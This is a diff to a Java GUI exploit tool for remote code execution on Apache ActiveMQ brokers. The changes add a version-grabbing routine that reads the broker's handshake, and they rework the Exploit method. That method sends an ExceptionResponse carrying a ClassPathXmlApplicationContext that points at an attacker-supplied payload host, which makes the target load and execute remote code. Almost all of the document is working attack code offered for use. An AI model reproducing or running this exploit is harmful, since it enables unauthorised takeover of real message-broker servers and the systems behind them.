@@ -1,18 +1,37 @@
 package org.example;
 
+import org.apache.activemq.ActiveMQConnection;
 import org.apache.activemq.ActiveMQConnectionFactory;
+import org.apache.activemq.ActiveMQConnectionMetaData;
 import org.apache.activemq.ActiveMQSession;
+import org.apache.activemq.broker.BrokerService;
+import org.apache.activemq.broker.TransportConnection;
 import org.apache.activemq.command.ExceptionResponse;
+import org.apache.activemq.command.WireFormatInfo;
+import org.apache.activemq.util.ByteArrayInputStream;
+import org.apache.activemq.util.ByteSequence;
+import org.apache.activemq.util.MarshallingSupport;
+import org.apache.activemq.wireformat.WireFormat;
 import org.springframework.context.support.ClassPathXmlApplicationContext;
 
 import javax.jms.Connection;
 import javax.jms.ConnectionFactory;
 import javax.jms.JMSException;
+import javax.jms.Session;
 import javax.swing.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
+import java.io.*;
 import java.net.ConnectException;
+import java.net.ServerSocket;
+import java.net.Socket;
 import java.net.SocketTimeoutException;
+import java.nio.ByteBuffer;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.concurrent.CopyOnWriteArrayList;
+
+
 
 public class ActiveMQ_RCE_GUI {
     private JPanel panel1;
@@ -90,6 +109,23 @@ public class ActiveMQ_RCE_GUI {
 
         return 0;
     }
+    public String GetServerVersion(String serverAddress,String serverPort){
+        try {
+            Socket clientSocket = new Socket(serverAddress, Integer.parseInt(serverPort));
+
+            DataInputStream dataInputStream = new DataInputStream(clientSocket.getInputStream());
+            //ObjectInputStream ois = new ObjectInputStream(clientSocket.getInputStream());
+            byte[] Header = new byte[22];
+            dataInputStream.readFully(Header);
+
+             Map<String,Object > maps = MarshallingSupport.unmarshalPrimitiveMap(dataInputStream, 4096);
+            return maps.get("ProviderVersion").toString();
+            } catch (Exception e) {
+            e.printStackTrace();
+            return "";
+        }
+
+    }
     public  void Exploit(String p_TargetIp,String p_TargetPort,String p_PayloadHost) {
         try{
             AreaAppend("[*] Start Exploiting the Vulnerability on TargetIp:"+p_TargetIp);
@@ -99,16 +135,23 @@ public class ActiveMQ_RCE_GUI {
 
             Connection connection = connectionFactory.createConnection("admin", "admin");
             connection.start();
+            ActiveMQSession session = (ActiveMQSession)connection.createSession(false, Session.AUTO_ACKNOWLEDGE);
+
+            // WireFormatInfo wireFormatInfo =
+            String activeMQVersion = GetServerVersion(p_TargetIp,p_TargetPort);
+            ActiveMQConnection activemqconnection = (ActiveMQConnection)connection;
+
+          //  (ActiveMQConnection(connection))
 
             //Session VersionSession = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);
             AreaAppend("[+] Conversation suggestion Successful");
             AreaAppend("[+] Request Target version Information");
-            //getBrokerService(session);
-            //connection.getBrokerInfo().getBrokerVersion();
-            //String activeMQVersion = "";//brokerService.getBrokerName();
+            //ActiveMQConnectionMetaData metaData =(ActiveMQConnectionMetaData)connection.getMetaData();
 
-            String activeMQVersion = connection.getMetaData().getProviderVersion().toString();
-            System.out.println("ActiveMQ Version: " + activeMQVersion);
+
+            //tring activeMQVersion =connection.getMetaData().getProviderVersion();
+
+
 
             String version2 = "5.18.2";
 
@@ -125,15 +168,16 @@ public class ActiveMQ_RCE_GUI {
             }
 
             AreaAppend("[*] Start Exploiting the Vulnerability");
-            ActiveMQSession session = (ActiveMQSession) connection.createSession();
             ExceptionResponse exceptionResponse = new ExceptionResponse();
 
             exceptionResponse.setException(new ClassPathXmlApplicationContext(p_PayloadHost));
+            ActiveMQSession ExploitSession = (ActiveMQSession) connection.createSession();
+            ExploitSession.syncSendPacket(exceptionResponse);
 
-            session.syncSendPacket(exceptionResponse);
             AreaAppend("[+] Vulnerability exploited successfully");
-            AreaAppend("[+] Exploit completed");
+
             connection.close();
+
         }catch (JMSException e) {
             if (e.getCause() instanceof SocketTimeoutException) {
                 // 处理连接超时异常
